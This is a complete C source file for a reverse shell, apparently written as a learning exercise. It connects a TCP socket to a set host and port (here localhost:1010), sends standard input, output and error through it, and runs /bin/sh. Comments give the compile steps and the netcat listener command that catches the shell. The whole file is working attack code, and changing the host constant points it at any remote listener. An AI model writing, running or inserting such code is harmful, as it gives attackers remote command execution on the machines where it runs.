
// inspirations:
// https://gta.ufrj.br/ensino/eel878/sockets/

#include <stdio.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <string.h>

#define RP 1010
#define RH "127.0.0.1"
#define BIN "/bin/sh"

int main(/*int argc, char *argv[]  not used as we got char * const argv below*/){
  
  // init to 0 always
  // else undef behavior (which gives me nightmares)
  int is = 0;
  is = socket(AF_INET,SOCK_STREAM,0);
  
  //struct the socks
  struct  sockaddr_in s1;
                      s1.sin_family      = AF_INET;
                      s1.sin_port        = htons(RP);
                      s1.sin_addr.s_addr = inet_addr(RH);

  //con
  connect(is,(struct sockaddr *) &s1,sizeof(s1));
  
  //redir
  for(int i=0;i<3;dup2(is,i),i++);
  
  char * const argv[] = {BIN,NULL};
               execve(BIN,argv,
               NULL); // always have NULL@the end to terminate.
return 0;
}

// compile and run:
// gcc -o RSH rsh.c
// ./RSH

// in another term: sudo nc -vnlp 1010
